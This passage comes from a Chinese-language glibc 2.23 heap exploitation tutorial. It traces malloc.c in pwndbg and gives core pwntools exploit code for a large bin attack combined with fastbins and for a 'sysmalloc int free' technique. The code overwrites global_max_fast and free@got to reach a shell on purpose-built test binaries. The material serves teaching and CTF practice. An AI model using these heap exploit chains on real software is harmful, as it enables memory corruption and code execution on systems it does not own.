   3467   for (;; )
   3468     {
   3469       int iters = 0;
   3470       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
   3471         {
 ► 3472           bck = victim->bk;
 
pwndbg> p/x victim
$10 = 0x185859a0
pwndbg> p/x victim->bk
$11 = 0x7d2e9a18db78

In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3521
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
   3517           bck->fd = unsorted_chunks (av);
   3518 
   3519           /* Take now instead of binning if exact fit */
   3520 
 ► 3521           if (size == nb)
    3522             {

pwndbg> p/x size
$13 = 0x510
pwndbg> p/x nb
$14 = 0xa0
```

提取unsortedbin里0x185859a0，准备作为此次申请的内容。由于尺寸远大于目标，还是跳过`if (size == nb)`条件。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3542
   3534           if (in_smallbin_range (size))
   3535             {
   3536               victim_index = smallbin_index (size);
   3537               bck = bin_at (av, victim_index);
   3538               fwd = bck->fd;
   3539             }
   3540           else
   3541             {
 ► 3542               victim_index = largebin_index (size);
   3543               bck = bin_at (av, victim_index);
   3544               fwd = bck->fd;
   
pwndbg> p/x size
$15 = 0x510
```

由于这次size属于large bin，进入else分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3547
   3541             {
   3542               victim_index = largebin_index (size);
   3543               bck = bin_at (av, victim_index);
   3544               fwd = bck->fd;
   3545 
   3546               /* maintain large bins in sorted order */
 ► 3547               if (fwd != bck)
   3548                 {
    
pwndbg> p/x bck
$16 = 0x7d2e9a18dfa8
pwndbg> p/x fwd
$17 = 0x18585460
```

由于fwd != bck条件成立，进入该分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3553
   3547               if (fwd != bck)
   3548                 {
   3549                   /* Or with inuse bit to speed comparisons */
   3550                   size |= PREV_INUSE;
   3551                   /* if smaller than smallest, bypass loop below */
   3552                   assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
 ► 3553                   if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
   3554                     {
   
pwndbg> p/x bck->bk->size
$18 = 0x3f1
pwndbg> p/x size
$19 = 0x511
```

由于不满足((unsigned long) (size) < (unsigned long) (bck->bk->size))，进入其else分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3564
   3558                       victim->fd_nextsize = fwd->fd;
   3559                       victim->bk_nextsize = fwd->fd->bk_nextsize;
   3560                       fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
   3561                     }
   3562                   else
   3563                     {
   3564                       assert ((fwd->size & NON_MAIN_ARENA) == 0);
 ► 3565                       while ((unsigned long) size < fwd->size)
   3566                         {
   3567                           fwd = fwd->fd_nextsize;
   3568                           assert ((fwd->size & NON_MAIN_ARENA) == 0);
   3569                         }

pwndbg> p/x size
$25 = 0x511
pwndbg> p/x fwd
$26 = 0x18585460
pwndbg> p/x fwd->size
$27 = 0x3f1
```

由于size < fwd->size条件不满足，直接跳过fd_nextsize链表遍历。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3576
   3570 
   3571                       if ((unsigned long) size == (unsigned long) fwd->size)
   3572                         /* Always insert in the second position.  */
   3573                         fwd = fwd->fd;
   3574                       else
   3575                         {
 ► 3576                           victim->fd_nextsize = fwd;
   3577                           victim->bk_nextsize = fwd->bk_nextsize;
   3578                           fwd->bk_nextsize = victim;
   3579                           victim->bk_nextsize->fd_nextsize = victim;
```

由于size == (unsigned long) fwd->size还是不满足，进入其else分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3579
   3573                         fwd = fwd->fd;
   3574                       else
   3575                         {
   3576                           victim->fd_nextsize = fwd;
   3577                           victim->bk_nextsize = fwd->bk_nextsize;
   3578                           fwd->bk_nextsize = victim;
 ► 3579                           victim->bk_nextsize->fd_nextsize = victim;
 
pwndbg> p/x victim
$29 = 0x185859a0
pwndbg> p/x victim->bk_nextsize
$30 = 0x4041c0
pwndbg> p/x victim->bk_nextsize->fd_nextsize
$31 = 0xdb113b30f005d328
pwndbg> x/1gx &magic
0x4041e0 <magic>:       0xdb113b30f005d328
pwndbg> 
```

此处便是实现任意地址写的bug点。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3592
   3586             }
   3587 
   3588           mark_bin (av, victim_index);
   3589           victim->bk = bck;
   3590           victim->fd = fwd;
   3591           fwd->bk = victim;
 ► 3592           bck->fd = victim;
 
pwndbg> p/x bck
$33 = 0x4041d0
pwndbg> p/x bck->fd
$34 = 0x185859a0
pwndbg> x/1gx &magic
0x4041e0 <magic>:       0x00000000185859a0
pwndbg> 
```

此处便是实现任意地址写的另外一个bug点。

可以发现magic已经修改为0x00000000185859a0。直接利用其测试二进制的后门函数，获取shell的控制权。


### 1-11 large bin attack其二

本方法为large bin attack和fast bin的组合技，large bin attack核心原理参考large bin attack其一，此处不在赘述。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/05/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/large_bin_attack_again/exploit.py)。

核心利用代码如下：

```python
# unsorted bin leak
malloc(0, 0x420, b"A" * 0x8)
malloc(1, 0x20, b"A" * 0x8)
malloc(2, 0x500, b"B" * 0x8)
malloc(3, 0x20, b"B" * 0x8)
malloc(4, 0x500, b"C" * 0x8)
malloc(5, 0x20, b"C" * 0x8)
delete(0)
delete(2)
# pwndbg> unsortedbin
# unsortedbin
# all: 0x13516460 —▸ 0x13516000 —▸ 0x7e64b5b8db78 (main_arena+88) ◂— 0x13516460
# pwndbg> heap
# Free chunk (unsortedbin) | PREV_INUSE
# Addr: 0x13516000
# Size: 0x430 (with flag bits: 0x431)
# fd: 0x7e64b5b8db78
# bk: 0x13516460
#
# Allocated chunk
# Addr: 0x13516430
# Size: 0x30 (with flag bits: 0x30)
#
# Free chunk (unsortedbin) | PREV_INUSE
# Addr: 0x13516460
# Size: 0x510 (with flag bits: 0x511)
# fd: 0x13516000
# bk: 0x7e64b5b8db78
#
# Allocated chunk
# Addr: 0x13516970
# Size: 0x30 (with flag bits: 0x30)
#
# Allocated chunk | PREV_INUSE
# Addr: 0x135169a0
# Size: 0x510 (with flag bits: 0x511)
#
# Allocated chunk | PREV_INUSE
# Addr: 0x13516eb0
# Size: 0x30 (with flag bits: 0x31)
#
# Top chunk | PREV_INUSE
# Addr: 0x13516ee0
# Size: 0x20120 (with flag bits: 0x20121)
#
# pwndbg>
show(0)
# pwndbg> x/4gx 0x13516000
# 0x13516000:     0x0000000000000000      0x0000000000000431
# 0x13516010:     0x00007e64b5b8db78      0x0000000013516460
# pwndbg>
main_arena88_leak = u64(conn.recv(6).ljust(8, b"\x00"))
libc.address = main_arena88_leak - 0x38DB78
log.info(f"main_arena+88 leak: {hex(main_arena88_leak)}")
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# large bin attack
malloc(6, 0x90, b"D" * 0x8)
# pwndbg> bins
# fastbins
# empty
# unsortedbin
# all: 0x135160a0 —▸ 0x7e64b5b8db78 (main_arena+88) ◂— 0x135160a0
# smallbins
# empty
# largebins
# 0x500-0x530: 0x13516460 —▸ 0x7e64b5b8dfa8 (main_arena+1160) ◂— 0x13516460
# pwndbg>
delete(4)
# pwndbg> bins
# fastbins
# empty
# unsortedbin
# all: 0x135169a0 —▸ 0x135160a0 —▸ 0x7e64b5b8db78 (main_arena+88) ◂— 0x135169a0
# smallbins
# empty
# largebins
# 0x500-0x530: 0x13516460 —▸ 0x7e64b5b8dfa8 (main_arena+1160) ◂— 0x13516460
# pwndbg> x/12gx 0x0000000013516440-0x10
# 0x13516430:     0x0000000000000390      0x0000000000000030  <= chunk 1
# 0x13516440:     0x4141414141414141      0x0000000000000000
# 0x13516450:     0x0000000000000000      0x0000000000000000
# 0x13516460:     0x0000000000000000      0x0000000000000511  <= chunk 2
# 0x13516470:     0x00007e64b5b8dfa8      0x00007e64b5b8dfa8
# 0x13516480:     0x0000000013516460      0x0000000013516460
# pwndbg> x/16gx chunks
# 0x4040c0 <chunks>:      0x0000000000000420      0x0000000013516010
# 0x4040d0 <chunks+16>:   0x0000000000000020      0x0000000013516440
# 0x4040e0 <chunks+32>:   0x0000000000000500      0x0000000013516470
# 0x4040f0 <chunks+48>:   0x0000000000000020      0x0000000013516980
# 0x404100 <chunks+64>:   0x0000000000000500      0x00000000135169b0
# 0x404110 <chunks+80>:   0x0000000000000020      0x0000000013516ec0
# 0x404120 <chunks+96>:   0x0000000000000090      0x0000000013516010
# 0x404130 <chunks+112>:  0x0000000000000000      0x0000000000000000
# pwndbg>
payload = b"A" * 0x28 + p64(0x3F1)
payload += p64(0) + p64(libc.sym["global_max_fast"] - 0x10)
payload += p64(0) + p64(libc.sym["global_max_fast"] - 0x20)
edit(1, len(payload), payload)
# pwndbg> x/12gx 0x0000000013516440-0x10
# 0x13516430:     0x0000000000000390      0x0000000000000030
# 0x13516440:     0x4141414141414141      0x4141414141414141
# 0x13516450:     0x4141414141414141      0x4141414141414141
# 0x13516460:     0x4141414141414141      0x00000000000003f1
# 0x13516470:     0x0000000000000000      0x00007e64b5b8f7c8
# 0x13516480:     0x0000000000000000      0x00007e64b5b8f7b8
# pwndbg> x/1gx &global_max_fast
# 0x7e64b5b8f7d8 <global_max_fast>:       0x0000000000000080
# pwndbg>
malloc(7, 0x80, b"E" * 0x8)
# pwndbg> x/1gx &global_max_fast
# 0x7e64b5b8f7d8 <global_max_fast>:       0x00000000135169a0
# pwndbg>
delete(7)
# pwndbg> bins
# fastbins
# 0x90: 0x135160a0 ◂— 0
# unsortedbin
# all: 0x13516130 —▸ 0x7e64b5b8db78 (main_arena+88) ◂— 0x13516130
# smallbins
# empty
# largebins
# 0x500-0x530 [corrupted]
# FD: 0x13516460 ◂— 0
# BK: 0x13516460 —▸ 0x135169a0 —▸ 0x7e64b5b8f7c8 (__free_hook) ◂— 0
# pwndbg>
edit(7, 0x8, p64(0x404118))
malloc(8, 0x80, b"F" * 0x8)
malloc(9, 0x80, b"F" * 0x8)
# pwndbg> x/20gx chunks
# 0x4040c0 <chunks>:      0x0000000000000420      0x0000000013516010
# 0x4040d0 <chunks+16>:   0x0000000000000050      0x0000000013516440
# 0x4040e0 <chunks+32>:   0x0000000000000500      0x0000000013516470
# 0x4040f0 <chunks+48>:   0x0000000000000020      0x0000000013516980
# 0x404100 <chunks+64>:   0x0000000000000500      0x00000000135169b0
# 0x404110 <chunks+80>:   0x0000000000000020      0x0000000013516ec0
# 0x404120 <chunks+96>:   0x0000000000000090      0x4646464646464646
# 0x404130 <chunks+112>:  0x0000000000000008      0x00000000135160b0
# 0x404140 <chunks+128>:  0x0000000000000080      0x00000000135160b0
# 0x404150 <chunks+144>:  0x0000000000000080      0x0000000000404128
# pwndbg>
payload = p64(0x00404000) + p64(0) + p64(binsh_addr)
edit(9, len(payload), payload)
# pwndbg> x/20gx chunks
# 0x4040c0 <chunks>:      0x0000000000000420      0x0000000013516010
# 0x4040d0 <chunks+16>:   0x0000000000000050      0x0000000013516440
# 0x4040e0 <chunks+32>:   0x0000000000000500      0x0000000013516470
# 0x4040f0 <chunks+48>:   0x0000000000000020      0x0000000013516980
# 0x404100 <chunks+64>:   0x0000000000000500      0x00000000135169b0
# 0x404110 <chunks+80>:   0x0000000000000020      0x0000000013516ec0
# 0x404120 <chunks+96>:   0x0000000000000090      0x0000000000404000
# 0x404130 <chunks+112>:  0x0000000000000000      0x00007e64b5956d73
# 0x404140 <chunks+128>:  0x0000000000000080      0x00000000135160b0
# 0x404150 <chunks+144>:  0x0000000000000018      0x0000000000404128
# pwndbg> x/1gx 0x0000000000404000
# 0x404000 <free@got.plt>:        0x00007e64b5873a9b
# pwndbg> x/s 0x00007e64b5956d73
# 0x7e64b5956d73: "/bin/sh"
# pwndbg>
edit(6, 0x8, p64(libc.sym["system"]))
# pwndbg> x/1gx 0x0000000000404000
# 0x404000 <free@got.plt>:        0x00007e64b583c3eb
# pwndbg> x/5i 0x00007e64b583c3eb
#    0x7e64b583c3eb <__libc_system>:      sub    rsp,0x8
#    0x7e64b583c3ef <__libc_system+4>:    test   rdi,rdi
#    0x7e64b583c3f2 <__libc_system+7>:    jne    0x7e64b583c40a <__libc_system+31>
#    0x7e64b583c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7e64b5956d7b
#    0x7e64b583c3fb <__libc_system+16>:   call   0x7e64b583be36 <do_system>
# pwndbg>
delete(7)
cmd = b"cat src/2.23/large_bin_attack_again/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先利用unsorted bin leak获取libc地址，然后利用large bin attack修改global_max_fast为0x00000000135169a0地址， 接着在.bss上构造fast bin fake chunk，连续申请0x80块大小的chunk，最终获取.bss的控制权。 经过上面的操作，获取shell就水到渠成了。


### 1-12 sysmalloc int free

当目标只有分配、查看、编辑功能，却缺失了关键的释放功能。初看起来目标不存在任何漏洞，利用本方法巧妙的制作出来free的效果。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/04/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/sysmalloc_int_free/exploit.py)。

核心利用代码如下：

```python
SIZE_SZ = 0x8
CHUNK_HDR_SZ = SIZE_SZ * 2
MALLOC_ALIGN = SIZE_SZ * 2
MALLOC_MASK = -MALLOC_ALIGN
PAGESIZE = 0x1000
PAGE_MASK = PAGESIZE - 1
FENCEPOST = CHUNK_HDR_SZ * 2
PROBE = 0x20 - CHUNK_HDR_SZ
CHUNK_FREED_SIZE = 0x150
FREED_SIZE = CHUNK_FREED_SIZE - CHUNK_HDR_SZ

# sysmalloc int free
malloc(0, PROBE, b"A" * 0x8)
allocated_size = 0x20FE1 - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE
allocated_size &= PAGE_MASK
allocated_size &= MALLOC_MASK
malloc(1, allocated_size, b"B" * 0x8)
payload = b"B" * (allocated_size + 0x8) + p64(0x20171 & PAGE_MASK)
edit(1, len(payload), payload)
# create an unsorted bin
malloc(2, CHUNK_FREED_SIZE + 0x10, b"C" * 0x8)

# unsorted bin attack
payload = b"B" * (allocated_size + 0x8) + b"A" * 0x8
edit(1, len(payload), payload)
show(1)
conn.recvuntil(payload)
libc_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"libc leak: {hex(libc_leak)}")
# 004041e0  uint64_t magic = 0x0
magic = 0x004041E0
payload = b"B" * (allocated_size + 0x8) + p64(0x151)
payload += p64(libc_leak) + p64(magic - 0x10)
edit(1, len(payload), payload)
# fetch the unsorted bin
malloc(3, FREED_SIZE, b"D" * 0x8)
use_magic(libc_leak)
conn.recv(1)
cmd = b"cat src/2.23/sysmalloc_int_free/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

代码比较抽象，接下来通过具体的heap结构清晰展示。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x3fff7000
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x3fff7020
Size: 0x20fe0 (with flag bits: 0x20fe1)

pwndbg> 
```

申请chunkA之后，可以看出来top-chunk->size = 0x20fe1。根据公式计算allocated_size作为下一次申请的大小。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x3fff7000
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x3fff7020
Size: 0xe70 (with flag bits: 0xe71)

Top chunk | PREV_INUSE
Addr: 0x3fff7e90
Size: 0x20170 (with flag bits: 0x20171)

pwndbg> 
```

将top-chunk->size修改为(0x20171 & PAGE_MASK），为free做好准备。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x3fff7000
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x3fff7020
Size: 0xe70 (with flag bits: 0xe71)

Top chunk | PREV_INUSE
Addr: 0x3fff7e90
Size: 0x170 (with flag bits: 0x171)

pwndbg>
```

申请chunkC触发free操作。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3796
   3790          to put in fenceposts in sysmalloc.)
   3791        */
   3792 
   3793       victim = av->top;
   3794       size = chunksize (victim);
   3795 
 ► 3796       if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
   3797         {
   
pwndbg> p/x size
$1 = 0x170
pwndbg> p/x nb
$2 = 0x170

In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3813
   3807           alloc_perturb (p, bytes);
   3808           return p;
   3809         }
   3810 
   3811       /* When we are using atomic ops to free fast chunks we can get
   3812          here for all block sizes.  */
 ► 3813       else if (have_fastchunks (av))
   3814         {
   
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3828
   3822 
   3823       /*
   3824          Otherwise, relay to handle system-dependent cases
   3825        */
   3826       else
   3827         {
 ► 3828           void *p = sysmalloc (nb, av);
```

由于((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))和(have_fastchunks (av))条件均不满足，进入else分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:2385
   2379   /* Record incoming configuration of top */
   2380 
   2381   old_top = av->top;
   2382   old_size = chunksize (old_top);
   2383   old_end = (char *) (chunk_at_offset (old_top, old_size));
   2384 
 ► 2385   brk = snd_brk = (char *) (MORECORE_FAILURE);
```

进入sysmalloc函数内，提取旧top-chunk，准备使用brk扩展top-chunk，并将old top释放掉。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:2716
   2710                       chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)->size =
   2711                         (2 * SIZE_SZ) | PREV_INUSE;
   2712 
   2713                       /* If possible, release the rest. */
   2714                       if (old_size >= MINSIZE)
   2715                         {
 ► 2716                           _int_free (av, old_top, 1);
 
pwndbg> p/x old_top 
$6 = 0x3fff7e90
pwndbg> x/4gx 0x3fff7e90
0x3fff7e90:     0x4242424242424242      0x0000000000000151
0x3fff7ea0:     0xc935efda466e2732      0x2237cad8a5973351
pwndbg> top-chunk 
Top chunk | PREV_INUSE
Addr: 0x40018000
Size: 0x22000 (with flag bits: 0x22001)

pwndbg> 
```

可以发现top-chunk已经更新，准备释放old_top，从而实现了free操作。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x3fff7e90 —▸ 0x7b90e198db78 (main_arena+88) ◂— 0x3fff7e90
pwndbg> 
```

可以发现成功制作出来unsortedbin了。接下来利用unsorted bin attack获取shell就轻车熟路了。

### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
